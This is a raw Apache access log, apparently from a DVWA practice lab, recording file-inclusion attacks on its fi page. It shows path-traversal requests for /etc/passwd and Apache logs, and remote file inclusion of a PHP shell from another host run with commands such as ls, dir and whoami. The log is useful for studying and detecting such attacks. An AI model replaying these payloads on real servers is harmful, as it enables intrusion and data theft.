192.168.220.1 - - [29/Nov/2017:08:49:00 -0500] "GET /dvwa/vulnerabilities/fi/?page=../../../../../etc/passwd HTTP/1.1" 200 5674 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:08:51:18 -0500] "GET /dvwa/vulnerabilities/fi/?page=../../../../../var/log/apache2/access.log HTTP/1.1" 200 4746 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:08:51:55 -0500] "GET /dvwa/vulnerabilities/fi/?page=../../../../../var/log/apache2/access.log HTTP/1.1" 200 4746 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:08:51:56 -0500] "GET /dvwa/vulnerabilities/fi/?page=../../../../../var/log/apache2/access.log HTTP/1.1" 200 4746 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:08:51:57 -0500] "GET /dvwa/vulnerabilities/fi/?page=../../../../../var/log/apache2/access.log HTTP/1.1" 200 4746 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:08:53:24 -0500] "GET /dvwa/vulnerabilities/fi/?page=../../../../../var/log/apache2/1.txt HTTP/1.1" 200 4736 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:08:53:30 -0500] "GET /dvwa/vulnerabilities/fi/?page=../../../../../var/log/apache2/1.txt HTTP/1.1" 200 4736 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:08:53:32 -0500] "GET /dvwa/vulnerabilities/fi/?page=../../../../../var/log/apache2/1.txt HTTP/1.1" 200 4736 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:08:53:32 -0500] "GET /dvwa/vulnerabilities/fi/?page=../../../../../var/log/apache2/1.txt HTTP/1.1" 200 4736 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:08:53:33 -0500] "GET /dvwa/vulnerabilities/fi/?page=../../../../../var/log/apache2/1.txt HTTP/1.1" 200 4736 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:08:53:33 -0500] "GET /dvwa/vulnerabilities/fi/?page=../../../../../var/log/apache2/1.txt HTTP/1.1" 200 4736 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:08:53:34 -0500] "GET /dvwa/vulnerabilities/fi/?page=../../../../../var/log/apache2/1.txt HTTP/1.1" 200 4736 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:08:53:34 -0500] "GET /dvwa/vulnerabilities/fi/?page=../../../../../var/log/apache2/1.txt HTTP/1.1" 200 4736 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:08:53:35 -0500] "GET /dvwa/vulnerabilities/fi/?page=../../../../../var/log/apache2/1.txt HTTP/1.1" 200 4736 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:08:53:36 -0500] "GET /dvwa/vulnerabilities/fi/?page=../../../../../var/log/apache2/1.txt HTTP/1.1" 200 4736 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:08:53:36 -0500] "GET /dvwa/vulnerabilities/fi/?page=../../../../../var/log/apache2/1.txt HTTP/1.1" 200 4736 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:08:53:37 -0500] "GET /dvwa/vulnerabilities/fi/?page=../../../../../var/log/apache2/1.txt HTTP/1.1" 200 4736 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:08:53:37 -0500] "GET /dvwa/vulnerabilities/fi/?page=../../../../../var/log/apache2/1.txt HTTP/1.1" 200 4736 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:08:53:38 -0500] "GET /dvwa/vulnerabilities/fi/?page=../../../../../var/log/apache2/1.txt HTTP/1.1" 200 4736 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:08:53:38 -0500] "GET /dvwa/vulnerabilities/fi/?page=../../../../../var/log/apache2/1.txt HTTP/1.1" 200 4736 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:08:53:43 -0500] "GET /dvwa/vulnerabilities/fi/?page=../../../../../var/log/apache2/access.log HTTP/1.1" 200 4746 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:08:53:44 -0500] "GET /dvwa/vulnerabilities/fi/?page=../../../../../var/log/apache2/access.log HTTP/1.1" 200 4746 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:08:53:44 -0500] "GET /dvwa/vulnerabilities/fi/?page=../../../../../var/log/apache2/access.log HTTP/1.1" 200 4746 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:08:56:28 -0500] "GET /dvwa/vulnerabilities/fi/?page=../../../../../var/www/dvwa/hackable/uploads/1.txt HTTP/1.1" 200 55882 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:08:56:28 -0500] "GET /dvwa/vulnerabilities/fi/index.php?=PHPE9568F34-D428-11d2-A769-00AA001ACF42 HTTP/1.1" 200 2524 "http://192.168.220.128/dvwa/vulnerabilities/fi/?page=../../../../../var/www/dvwa/hackable/uploads/1.txt" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:08:56:28 -0500] "GET /dvwa/vulnerabilities/fi/index.php?=PHPE9568F35-D428-11d2-A769-00AA001ACF42 HTTP/1.1" 200 2146 "http://192.168.220.128/dvwa/vulnerabilities/fi/?page=../../../../../var/www/dvwa/hackable/uploads/1.txt" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:08:56:28 -0500] "GET /dvwa/vulnerabilities/fi/index.php?=SUHO8567F54-D428-14d2-A769-00DA302A5F18 HTTP/1.1" 200 2813 "http://192.168.220.128/dvwa/vulnerabilities/fi/?page=../../../../../var/www/dvwa/hackable/uploads/1.txt" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:08:56:28 -0500] "GET /dvwa/vulnerabilities/fi/index.php?=PHPE9568F34-D428-11d2-A769-00AA001ACF42 HTTP/1.1" 200 2524 "http://192.168.220.128/dvwa/vulnerabilities/fi/?page=../../../../../var/www/dvwa/hackable/uploads/1.txt" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:08:56:28 -0500] "GET /dvwa/vulnerabilities/fi/index.php?=SUHO8567F54-D428-14d2-A769-00DA302A5F18 HTTP/1.1" 200 2813 "http://192.168.220.128/dvwa/vulnerabilities/fi/?page=../../../../../var/www/dvwa/hackable/uploads/1.txt" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:08:56:28 -0500] "GET /dvwa/vulnerabilities/fi/index.php?=PHPE9568F35-D428-11d2-A769-00AA001ACF42 HTTP/1.1" 200 2146 "http://192.168.220.128/dvwa/vulnerabilities/fi/?page=../../../../../var/www/dvwa/hackable/uploads/1.txt" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:03:33 -0500] "GET /dvwa/vulnerabilities/fi/?page=http://192.168.220.132/ HTTP/1.1" 200 4711 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:04:13 -0500] "GET /dvwa/vulnerabilities/fi/?page=http://192.168.220.132/1.php HTTP/1.1" 200 4721 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:04:15 -0500] "GET /dvwa/vulnerabilities/fi/?page=http://192.168.220.132/1.php HTTP/1.1" 200 4721 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:04:39 -0500] "GET /dvwa/vulnerabilities/fi/?page=http://192.168.220.132/1.php HTTP/1.1" 200 4721 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:04:42 -0500] "GET /dvwa/vulnerabilities/fi/?page=http://192.168.220.132/1.txt HTTP/1.1" 200 4721 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:04:50 -0500] "GET /dvwa/vulnerabilities/fi/?page=http://www.imooc.com/ HTTP/1.1" 200 229448 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:04:53 -0500] "GET /static/moco/v1.0/dist/css/moco.min.css?t=201711281133 HTTP/1.1" 404 322 "http://192.168.220.128/dvwa/vulnerabilities/fi/?page=http://www.imooc.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:04:53 -0500] "GET /static/img/index/logo_new.png HTTP/1.1" 404 313 "http://192.168.220.128/dvwa/vulnerabilities/fi/?page=http://www.imooc.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:04:53 -0500] "GET /static/img/common/appload.png HTTP/1.1" 404 313 "http://192.168.220.128/dvwa/vulnerabilities/fi/?page=http://www.imooc.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:04:53 -0500] "GET /dvwa/vulnerabilities/fi/5915802b0001da6206000338.jpg HTTP/1.1" 404 336 "http://192.168.220.128/dvwa/vulnerabilities/fi/?page=http://www.imooc.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:04:53 -0500] "GET /dvwa/vulnerabilities/fi/59cb5f4300014a4906000338.jpg HTTP/1.1" 404 336 "http://192.168.220.128/dvwa/vulnerabilities/fi/?page=http://www.imooc.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:04:53 -0500] "GET /dvwa/vulnerabilities/fi/585243df00014f2406000338.jpg HTTP/1.1" 404 336 "http://192.168.220.128/dvwa/vulnerabilities/fi/?page=http://www.imooc.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:04:53 -0500] "GET /dvwa/vulnerabilities/fi/59030d4e0001807a06000338.jpg HTTP/1.1" 404 336 "http://192.168.220.128/dvwa/vulnerabilities/fi/?page=http://www.imooc.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:04:53 -0500] "GET /passport/static/scripts/ssologin.js?v=2.0 HTTP/1.1" 404 319 "http://192.168.220.128/dvwa/vulnerabilities/fi/?page=http://www.imooc.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:04:53 -0500] "GET /static/sea-modules/seajs/seajs/2.1.1/sea.js HTTP/1.1" 404 327 "http://192.168.220.128/dvwa/vulnerabilities/fi/?page=http://www.imooc.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:04:53 -0500] "GET /static/sea_config.js?v=201711281133 HTTP/1.1" 404 304 "http://192.168.220.128/dvwa/vulnerabilities/fi/?page=http://www.imooc.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:04:53 -0500] "GET /dvwa/vulnerabilities/fi/5915802b0001da6206000338.jpg HTTP/1.1" 404 336 "http://192.168.220.128/dvwa/vulnerabilities/fi/?page=http://www.imooc.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:04:54 -0500] "GET /passport/static/scripts/ssologin.js?v=2.0 HTTP/1.1" 404 319 "http://192.168.220.128/dvwa/vulnerabilities/fi/?page=http://www.imooc.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:04:54 -0500] "GET /static/sea-modules/seajs/seajs/2.1.1/sea.js HTTP/1.1" 404 327 "http://192.168.220.128/dvwa/vulnerabilities/fi/?page=http://www.imooc.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:04:54 -0500] "GET /static/sea_config.js?v=201711281133 HTTP/1.1" 404 304 "http://192.168.220.128/dvwa/vulnerabilities/fi/?page=http://www.imooc.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:04:54 -0500] "GET /static/img/index/logo_new.png HTTP/1.1" 404 313 "http://192.168.220.128/dvwa/vulnerabilities/fi/?page=http://www.imooc.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:04:54 -0500] "GET /static/img/common/appload.png HTTP/1.1" 404 313 "http://192.168.220.128/dvwa/vulnerabilities/fi/?page=http://www.imooc.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:04:54 -0500] "GET /dvwa/vulnerabilities/fi/59cb5f4300014a4906000338.jpg HTTP/1.1" 404 336 "http://192.168.220.128/dvwa/vulnerabilities/fi/?page=http://www.imooc.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:04:54 -0500] "GET /dvwa/vulnerabilities/fi/585243df00014f2406000338.jpg HTTP/1.1" 404 336 "http://192.168.220.128/dvwa/vulnerabilities/fi/?page=http://www.imooc.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:04:54 -0500] "GET /dvwa/vulnerabilities/fi/59030d4e0001807a06000338.jpg HTTP/1.1" 404 336 "http://192.168.220.128/dvwa/vulnerabilities/fi/?page=http://www.imooc.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:04:54 -0500] "GET /static/img/common/new.png HTTP/1.1" 404 309 "http://192.168.220.128/dvwa/vulnerabilities/fi/?page=http://www.imooc.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:04:54 -0500] "GET /static/img/index/bk.jpg HTTP/1.1" 404 307 "http://192.168.220.128/dvwa/vulnerabilities/fi/?page=http://www.imooc.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:04:54 -0500] "GET /static/img/index/new/path_new.png HTTP/1.1" 404 317 "http://192.168.220.128/dvwa/vulnerabilities/fi/?page=http://www.imooc.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:04:54 -0500] "GET /static/img/index/icon.png HTTP/1.1" 404 309 "http://192.168.220.128/dvwa/vulnerabilities/fi/?page=http://www.imooc.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:04:54 -0500] "GET /dvwa/vulnerabilities/fi/59030cc50001144806000338.jpg HTTP/1.1" 404 336 "http://192.168.220.128/dvwa/vulnerabilities/fi/?page=http://www.imooc.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:04:54 -0500] "GET /dvwa/vulnerabilities/fi/58c7b92d0001608406000338.jpg HTTP/1.1" 404 336 "http://192.168.220.128/dvwa/vulnerabilities/fi/?page=http://www.imooc.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:04:54 -0500] "GET /dvwa/vulnerabilities/fi/5836c00a0001916906000338.jpg HTTP/1.1" 404 336 "http://192.168.220.128/dvwa/vulnerabilities/fi/?page=http://www.imooc.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:04:54 -0500] "GET /static/fonts/icomoon/fonts/icomoon.ttf?d8493nx HTTP/1.1" 404 322 "http://192.168.220.128/dvwa/vulnerabilities/fi/?page=http://www.imooc.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:04:54 -0500] "GET /static/fonts/DINCondm/DINCOND-MEDIUM.otf HTTP/1.1" 404 324 "http://192.168.220.128/dvwa/vulnerabilities/fi/?page=http://www.imooc.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:04:54 -0500] "GET /static/fonts/imv2/fonts/imv2.ttf?5yqf6o6 HTTP/1.1" 404 316 "http://192.168.220.128/dvwa/vulnerabilities/fi/?page=http://www.imooc.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:04:54 -0500] "GET /dvwa/vulnerabilities/fi/58d1f2dc0001eedf06000338.jpg HTTP/1.1" 404 336 "http://192.168.220.128/dvwa/vulnerabilities/fi/?page=http://www.imooc.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:04:54 -0500] "GET /dvwa/vulnerabilities/fi/59ae66c5000139d906000338.jpg HTTP/1.1" 404 336 "http://192.168.220.128/dvwa/vulnerabilities/fi/?page=http://www.imooc.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:04:54 -0500] "GET /static/img/index/eliteTbg.jpg HTTP/1.1" 404 313 "http://192.168.220.128/dvwa/vulnerabilities/fi/?page=http://www.imooc.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:04:54 -0500] "GET /static/img/idx-btm.png HTTP/1.1" 404 306 "http://192.168.220.128/dvwa/vulnerabilities/fi/?page=http://www.imooc.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:04:54 -0500] "GET /static/img/common/elevator.png?t=2 HTTP/1.1" 404 314 "http://192.168.220.128/dvwa/vulnerabilities/fi/?page=http://www.imooc.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:04:54 -0500] "GET /static/img/common/touch-icon-ipad-retina.png HTTP/1.1" 404 328 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:04:54 -0500] "GET /static/fonts/icomoon/fonts/icomoon.woff?d8493nx HTTP/1.1" 404 323 "http://192.168.220.128/dvwa/vulnerabilities/fi/?page=http://www.imooc.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:04:54 -0500] "GET /static/fonts/imv2/fonts/imv2.woff?5yqf6o6 HTTP/1.1" 404 317 "http://192.168.220.128/dvwa/vulnerabilities/fi/?page=http://www.imooc.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:06:58 -0500] "GET /dvwa/vulnerabilities/fi/?page=http://192.168.220.144/1.php HTTP/1.1" 200 3499 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:07:53 -0500] "GET /dvwa/vulnerabilities/fi/?page=http://192.168.220.144/1.txt HTTP/1.1" 200 3499 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:08:10 -0500] "GET /dvwa/vulnerabilities/fi/?page=http://192.168.220.144/1.txt?cmd=ls HTTP/1.1" 200 3499 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:08:37 -0500] "GET /dvwa/vulnerabilities/fi/?page=http://192.168.220.144/a.php?cmd=ls HTTP/1.1" 200 3499 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:08:43 -0500] "GET /dvwa/vulnerabilities/fi/?page=http://192.168.220.144/a.php?cmd=ls HTTP/1.1" 200 3499 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:08:45 -0500] "GET /dvwa/vulnerabilities/fi/?page=http://192.168.220.144/a.php?cmd=ls HTTP/1.1" 200 3499 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:10:44 -0500] "GET /dvwa/vulnerabilities/fi/?page=http://192.168.220.144/a.php?cmd=dir HTTP/1.1" 200 5115 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:10:56 -0500] "GET /dvwa/vulnerabilities/fi/?page=http://192.168.220.144/a.php?cmd=whoami HTTP/1.1" 200 4194 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:12:37 -0500] "GET /dvwa/vulnerabilities/fi/?page=http://192.168.220.144/a.php?cmd=dir HTTP/1.1" 200 5115 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:12:42 -0500] "GET /dvwa/vulnerabilities/fi/?page=http://192.168.220.144/a.php?cmd=dir HTTP/1.1" 200 5115 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:15:05 -0500] "GET /dvwa/vulnerabilities/fi/?page=../../../../../var/log/apache2/1.txt HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:15:05 -0500] "GET /dvwa/login.php HTTP/1.1" 200 1289 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:15:05 -0500] "GET /dvwa/dvwa/css/login.css HTTP/1.1" 200 608 "http://192.168.220.128/dvwa/login.php" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:15:05 -0500] "GET /dvwa/dvwa/images/login_logo.png HTTP/1.1" 200 12875 "http://192.168.220.128/dvwa/login.php" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:18:20 -0500] "GET /dvwa/vulnerabilities/fi/?page=http://192.168.220.144/1.txt?cmd=dir HTTP/1.1" 200 3499 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:18:25 -0500] "GET /dvwa/vulnerabilities/fi/?page=http://192.168.220.144/1.txt?cmd=dir HTTP/1.1" 200 3499 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
192.168.220.1 - - [29/Nov/2017:09:18:35 -0500] "GET /dvwa/vulnerabilities/fi/?page=http://192.168.220.144/1.txt HTTP/1.1" 200 3499 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
